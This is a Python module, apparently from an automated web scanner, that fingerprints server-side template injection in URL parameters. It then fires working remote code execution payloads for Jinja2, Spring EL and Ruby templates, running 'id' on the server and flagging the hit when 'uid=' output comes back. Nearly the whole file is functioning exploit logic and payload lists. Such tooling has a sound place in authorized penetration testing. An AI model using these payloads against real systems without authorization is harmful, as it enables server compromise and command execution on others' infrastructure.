"""Advanced SSTI: engine fingerprinting + RCE payloads."""
import urllib.parse
from core.http import get
from core.findings import Finding
from core.memory import log_event

# (payload, expected, engine)
PROBES = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "Freemarker/Velocity"),
    ("#{7*7}", "49", "Ruby ERB/Thymeleaf"),
    ("<%= 7*7 %>", "49", "ERB/JSP"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("${{7*7}}", "49", "Spring EL"),
    ("@(7*7)", "49", "Razor"),
    ("{7*7}", "49", "Smarty"),
]

RCE_PAYLOADS = [
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{system('id')}",
    "<%= system('id') %>",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    if not test_params:
        return findings
    for param in test_params:
        # fingerprint
        for payload, expected, engine in PROBES:
            q = dict(qs)
            q[param] = [payload]
            new_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            r = get(new_url)
            if r.status == 0:
                continue
            if expected in (r.text or ""):
                base_r = get(parsed._replace(query=urllib.parse.urlencode({k: v for k, v in qs.items()}, doseq=True)).geturl() if qs else parsed.geturl())
                if expected not in (base_r.text or ""):
                    findings.append(Finding(
                        id=f"ssti-adv-{engine}-{hash(new_url) & 0xffff:x}",
                        target=parsed.netloc,
                        type=f"SSTI ({engine})",
                        severity="high",
                        url=new_url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Template evaluated: {payload} -> {expected}",
                        response_snippet=r.snippet(300),
                        confidence=0.85,
                    ))
                    # try RCE
                    for rce in RCE_PAYLOADS[:2]:
                        q2 = dict(qs)
                        q2[param] = [rce]
                        r2 = get(parsed._replace(query=urllib.parse.urlencode(q2, doseq=True)).geturl())
                        if r2.status != 0 and any(m in (r2.text or "") for m in ["uid=", "gid=", "root"]):
                            findings.append(Finding(
                                id=f"ssti-rce-{hash(new_url+rce) & 0xffff:x}",
                                target=parsed.netloc,
                                type=f"SSTI RCE ({engine})",
                                severity="critical",
                                url=new_url,
                                parameter=param,
                                payload=rce,
                                evidence="Command output in response",
                                response_snippet=r2.snippet(300),
                                confidence=0.9,
                            ))
                    break
    log_event(parsed.netloc, "ssti_advanced_scan", {"url": url, "findings": len(findings)})
    return findings
